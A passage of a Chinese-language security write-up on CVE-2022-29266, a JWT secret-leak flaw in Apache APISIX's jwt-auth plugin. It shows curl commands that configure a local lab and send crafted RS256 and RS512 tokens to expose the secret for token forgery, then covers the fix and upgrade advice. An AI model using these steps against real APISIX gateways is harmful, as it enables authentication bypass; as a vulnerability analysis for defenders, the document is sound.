"upstream": {
"type": "roundrobin",
"nodes": {
"0.0.0.0:80": 1
}
}
}'
1
2
3
4
5
6
7
8
9
10
11
12
13
14
Plain Text
复制代码
curl http://127.0.0.1:9080/index.html?
jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlX
Pb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FG
GmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFkl
xrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN
_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-
C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i
1
9
当我们拿到这个 sceret 值后，就可以伪造 JWT Token 了。 
那么根据上⾯的漏洞分析，这⾥如果使⽤ RS512 算法应该也能触发这个漏洞，在 jwt.io 上⽣成 RS512 
的 JWT 值如下： 
10
利⽤ curl 访问 
果然使⽤ RS512 算法同样可以触发，说明漏洞分析的没⽑病。 
接着看看如果 secret 中包含了 CERTIFICATE 和 PUBLIC KEY 字符串，会返回什么。 
重新开⼀个环境后，创建⼀个 consumer 对象，这次 secret 设置为 teamssix-CERTIFICATE 
Plain Text
复制代码
eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.bMCMT2wCP8X6d
uvDDuaR232ae3XkA3d2g-FKvI-D73sk8nTRWZEfovoh_FFi5PquyC81J5i5bED-
rh1RMuDHlJVMYDKTP-EPdoRxugBdCCq9iEL3A004PTQM21rWLcPe1SOqp2Qvcf41iH-
5r5Zs5cuAraQm4qFyhooCziSIPNnbyb8VUMx6k7fGS-WIBMVti-
SjG5dEGLwAckCjc_XYMPrHqMRFYU_sB6jY05xX_9u5PFnuOQiu-q3c7gZLHdVSzHeYQGct-
nrjcrM2VHvdkMIwMOr25UMhu200HFDhpLXuWpic7WC-
rtztTZOtZne7UZ4s6MlnJavZiXWEq3Ovew
1
Plain Text
复制代码
curl http://127.0.0.1:9080/index.html?
jwt=eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.bMCMT2wCP
8X6duvDDuaR232ae3XkA3d2g-FKvI-D73sk8nTRWZEfovoh_FFi5PquyC81J5i5bED-
rh1RMuDHlJVMYDKTP-EPdoRxugBdCCq9iEL3A004PTQM21rWLcPe1SOqp2Qvcf41iH-
5r5Zs5cuAraQm4qFyhooCziSIPNnbyb8VUMx6k7fGS-WIBMVti-
SjG5dEGLwAckCjc_XYMPrHqMRFYU_sB6jY05xX_9u5PFnuOQiu-q3c7gZLHdVSzHeYQGct-
nrjcrM2VHvdkMIwMOr25UMhu200HFDhpLXuWpic7WC-
rtztTZOtZne7UZ4s6MlnJavZiXWEq3Ovew -i
1
11
创建 Route 对象，并开启 jwt-auth 插件 
触发漏洞 
Plain Text
复制代码
curl http://127.0.0.1:9080/apisix/admin/consumers -H 'X-API-KEY: 
edd1c9f034335f136f87ad84b625c8f1' -X PUT -d '
{
"username": "jack",
"plugins": {
"jwt-auth": {
"key": "rs-key",
"secret": "teamssix-CERTIFICATE"
}
}
}'
1
2
3
4
5
6
7
8
9
10
Plain Text
复制代码
curl http://127.0.0.1:9080/apisix/admin/routes/1 -H 'X-API-KEY: 
edd1c9f034335f136f87ad84b625c8f1' -X PUT -d '
{
"methods": ["GET"],
"uri": "/index.html",
"plugins": {
"jwt-auth": {}
},
"upstream": {
"type": "roundrobin",
"nodes": {
"0.0.0.0:80": 1
}
}
}'
1
2
3
4
5
6
7
8
9
10
11
12
13
14
12
可以看到，这⾥并没有返回刚才设置的 secret 值，⽽是返回了 not enough data，即 err 的信息，这表
明此时 cert 的值已经不为 nil 了，再次证明了上⾯的分析。 
观察 APISIX 的漏洞修复信息，可以看到对 jwt-auth.lua ⽂件的第 364 和 395 ⾏进⾏了修改，修复信息
地址：
https://github.com/apache/apisix/commit/61a48a2524a86f2fada90e8196e147538842db89 
漏洞代码修复 
Plain Text
复制代码
curl http://127.0.0.1:9080/index.html?
jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJycy1rZXkifQ.mF27BBWlX
Pb3fTiFufhcL3K9y99b8kioMmp7eMwRhB1kZjK62aJ_R6SB0A_Kmym8a7U2S3zYLue9mkD4FG
GmhwmkmUGppjZdtwfxrZc7JvvdpJbihNGxdfn9ywUspr6DX831e29VAy1DnLT6cU8do_9MFkl
xrRbhTVpDOsOADEhh6Q5zdTKPz3h5pKHSQYO4y5Xd0bmRM7TqRvhfIRchmvroaJBQjP6TrDrN
_x2elRpPsuabYmCNH_G7m6x5ouf0bqoOkOmsk3alJ6zNZFDY6-aTS4vDD8SDlSbAXkCh5DN-
C10YQ6ZYWUGmcbap7hQhaIVJRlZRtaXMFbmabLwhgg -i
1
13
这⾥是将原来的直接返回报错原因改成了返回 JWT token invalid 和 JWT token verify failed 的⽂本信
息。 
升级⾄ Apache APISIX 2.13.1 及以上版本 
安装补丁包，补丁包地址详⻅：https://apisix.apache.org/zh/blog/2022/04/20/cve-2022-
29266 
这个漏洞最终造成的⻛险是 JWT 伪造，但前提是需要对⽅的 APISIX 开启了 jwt-auth 插件才⾏，并且
如果有细⼼的读者可能会发现，当我们构造 RS256 算法的 JWT 时，需要先知道⽬标 APISIX consumer 
对象的 key 值，因此这个漏洞利⽤起来还是有⼀定限制的。 
这篇⽂章也已经同步到了 T Wiki 云安全知识⽂库中，⽂库地址：wiki.teamssix.com，⽂库中都是云安
全相关的⽂章，并且有很多来⾃⼤家共同贡献的云安全资源，也⾮常欢迎你⼀起来补充 T Wiki 云安全知
识⽂库。 
修复⽅案 
●
●
总结 
14
参考链接： 
https://t.zsxq.com/mqnAeeY 
https://www.jianshu.com/p/1b2c56687d0d 
https://teamssix.com/211214-175948.html 
https://apisix.apache.org/blog/2022/04/20/cve-2022-29266 
https://zone.huoxian.cn/d/1130-apache-apisix-jwt-cve-2022-29266 
由于笔者个⼈的技术⽔平有限，因此如果⽂章中有什么不正确的地⽅，欢迎在留⾔处指正，不胜感
激。